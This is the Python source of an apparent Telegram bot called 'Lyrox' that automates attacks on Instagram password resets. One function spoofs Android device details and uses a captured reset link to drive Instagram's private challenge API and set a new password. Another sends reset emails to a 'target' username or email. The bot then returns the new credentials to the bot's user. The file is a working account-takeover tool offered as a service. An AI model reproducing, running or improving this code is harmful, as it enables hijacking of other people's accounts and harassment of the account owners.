import os
import json
import random
import string
import uuid
from datetime import datetime
import httpx
import requests
from user_agent import generate_user_agent
from cfonts import render
import telebot
from telebot import types
from flask import Flask, request

# ==========================================
# 1. BOT & FLASK CONFIGURATION
# ==========================================
app = Flask(__name__)
TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(TOKEN, threaded=False)

# Simple dictionary to track user state since Vercel is stateless
# Note: In production, a database is better, but this handles quick sessions.
USER_STATE = {}

# ==========================================
# 2. CORE LOGIC (100% RETAINED)
# ==========================================
banner = render('Lyrox', colors=['white', 'blue'], align='center')

MESSAGES = {
    'ask_link': "🔗 <b>Please provide the Instagram Reset Link:</b>",
    'processing': "⌛ <b>Processing request... Please wait.</b>",
    'success_auto': "✅ <b>Password Changed Successfully!</b>\n\n👤 <b>Username:</b> <code>{}</code>\n🔑 <b>New Password:</b> <code>{}</code>",
    'fail_auto': "❌ <b>Operation failed:</b> {}",
    'send_code_success': "✅ <b>Reset Link Sent!</b>\n\n📩 <b>Sent to:</b> <code>{}</code>",
    'send_code_fail': "❌ <b>Instagram Error:</b> Email or Username not found.",
    'send_code_error': "❌ <b>Technical Error:</b> {}",
    'select_option': "<b>Lyrox Bot Control Panel</b>\n<i>Choose an automated service below:</i>",
    'option_1': "📧 Reset Email Sender",
    'option_2': "🔓 Reset Link Bypass",
    'enter_email_username': "📩 <b>Enter the Target Email or Username:</b>"
}

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; samsung; SM-G975F; en_US; {random.randint(100,999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:@Random.{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def acer(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid or "",
        "User-Agent": user_agent,
    }

def purna(reset_link):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {"source": "one_click_login_email", "uidb36": uidb36, "device_id": ANDROID_ID, "token": token, "waterfall_id": WATERFALL_ID}
        r = requests.post(url, headers=acer(user_agent=USER_AGENT), data=data, timeout=8)
        if "user_id" not in r.text: return {"success": False, "error": "Expired Link"}
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id, cni = resp_json.get("user_id"), resp_json.get("cni")
        challenge_context = resp_json.get("challenge_context")
        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {"user_id": str(user_id), "cni": str(cni), "nonce_code": str(resp_json.get("nonce_code")), "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}', "challenge_context": str(challenge_context), "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd", "get_challenge": "true"}
        r2 = requests.post(url2, headers=acer(mid, USER_AGENT), data=data2, timeout=8).text
        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        data3 = {"is_caa": "False", "cni": str(cni), "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}, "challenge_context": challenge_context_final, "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd", "enc_new_password1": PASSWORD, "enc_new_password2": PASSWORD}
        requests.post(url2, headers=acer(mid, USER_AGENT), data=data3, timeout=8)
        return {"success": True, "password": PASSWORD.split(":")[-1], "username": "Account"}
    except Exception as e: return {"success": False, "error": str(e)}

def send_code_core(user):
    try:
        with httpx.Client(http2=True, timeout=10) as client:
            gen_ua = generate_user_agent()
            client.get("https://www.instagram.com/accounts/password/reset/", headers={"user-agent": gen_ua})
            csrftoken = client.cookies.get('csrftoken', 'missing')
            payload = {"email_or_username": user}
            headers = {"user-agent": gen_ua, "x-ig-app-id": "936619743392459", "x-csrftoken": csrftoken, "content-type": "application/x-www-form-urlencoded"}
            r = client.post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data=payload, headers=headers)
            contact_point = r.json().get('contact_point')
            if contact_point: return True, MESSAGES['send_code_success'].format(contact_point)
            return False, MESSAGES['send_code_fail']
    except Exception as e: return False, MESSAGES['send_code_error'].format(str(e))

# ==========================================
# 3. HANDLERS
# ==========================================
def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(MESSAGES['option_1'], callback_data="set_email"),
               types.InlineKeyboardButton(MESSAGES['option_2'], callback_data="set_bypass"))
    return markup

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.send_message(message.chat.id, f"<code>{banner}</code>\n{MESSAGES['select_option']}", parse_mode='HTML', reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if call.data == "set_email":
        USER_STATE[call.from_user.id] = 'WAITING_EMAIL'
        bot.send_message(call.message.chat.id, MESSAGES['enter_email_username'], parse_mode='HTML')
    elif call.data == "set_bypass":
        USER_STATE[call.from_user.id] = 'WAITING_LINK'
        bot.send_message(call.message.chat.id, MESSAGES['ask_link'], parse_mode='HTML')

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    state = USER_STATE.get(message.from_user.id)
    if state == 'WAITING_EMAIL':
        USER_STATE[message.from_user.id] = None
        bot.send_message(message.chat.id, MESSAGES['processing'], parse_mode='HTML')
        _, feedback = send_code_core(message.text.strip())
        bot.send_message(message.chat.id, feedback, parse_mode='HTML', reply_markup=get_main_menu())
    elif state == 'WAITING_LINK':
        USER_STATE[message.from_user.id] = None
        bot.send_message(message.chat.id, MESSAGES['processing'], parse_mode='HTML')
        res = purna(message.text.strip())
        if res['success']:
            bot.send_message(message.chat.id, MESSAGES['success_auto'].format(res['username'], res['password']), parse_mode='HTML', reply_markup=get_main_menu())
        else:
            bot.send_message(message.chat.id, MESSAGES['fail_auto'].format(res['error']), parse_mode='HTML', reply_markup=get_main_menu())

# ==========================================
# 4. VERCEL ENTRY
# ==========================================
@app.route('/api/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return '', 200
    return 'Forbidden', 403

@app.route('/')
def index():
    return "Bot Online"
